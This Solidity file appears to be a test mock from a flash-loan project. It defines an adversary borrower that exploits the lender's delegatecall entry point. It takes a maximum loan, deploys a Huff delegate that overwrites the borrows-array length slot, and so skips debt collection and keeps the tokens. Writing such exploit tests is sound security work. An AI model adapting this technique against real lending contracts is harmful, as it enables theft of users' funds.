pragma solidity ^0.8.17;

import { ITransientLoan } from "../../src/interfaces/ITransientLoan.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { Token } from "../../src/Token.sol";
import { Constants } from "../utils/Constants.sol";
import { HuffDeployer } from "foundry-huff/HuffDeployer.sol";

contract MockAdversaryBorrower is IFlashLoanReceiver {
    /// @notice The transient loan contract
    ITransientLoan flashLoaner;
    /// @notice The mock erc20 that will be borrowed
    Token mockToken;

    constructor(ITransientLoan _flashLoaner, Token _mockToken) {
        flashLoaner = _flashLoaner;
        mockToken = _mockToken;
    }

    /// @notice Initiate the exploit
    function exploit() external {
        flashLoaner.startLoan();
    }

    /// @notice Submit captured tokens
    function submit() external {
        mockToken.approve(address(flashLoaner), type(uint256).max);
        flashLoaner.submit();
    }

    ////////////////////////////////////////////////////////////////
    //                  IFlashLoanReceiver impl                   //
    ////////////////////////////////////////////////////////////////

    /// @notice `IFlashLoanReceiver` implementation
    function bankroll() external {
        // Borrow some of the mock token
        (bool success,) = address(flashLoaner).call(
            abi.encodePacked(
                bytes4(flashLoaner.borrow.selector), address(mockToken), Constants.MAX_BORROW, address(this)
            )
        );
        assert(success);

        // Deploy contract to overwrite borrow length storage slot
        // PUSH1 0
        // PUSH1 block.timestamp
        // SSTORE (todo: TSTORE)
        address _exploit =
            HuffDeployer.config().with_uint_constant("SLOT", block.timestamp).deploy("delegates/Delegate");

        // Call the flash loaner contract's delegatecall logic with our exploit contract
        // to overwrite the borrows array length slot and skip the debt collection loop.
        // Should succeed.
        bytes32 param;
        assembly {
            // Store this contract's address in memory @ 0x00
            mstore(0x00, address())
            // Assign our param's value
            param := or(shl(0x60, _exploit), and(keccak256(0x00, 0x20), 0xFFFFFFFF))
        }
        (success,) = address(flashLoaner).call(abi.encodeWithSelector(flashLoaner.atlas.selector, param));
        assert(success);
    }
}
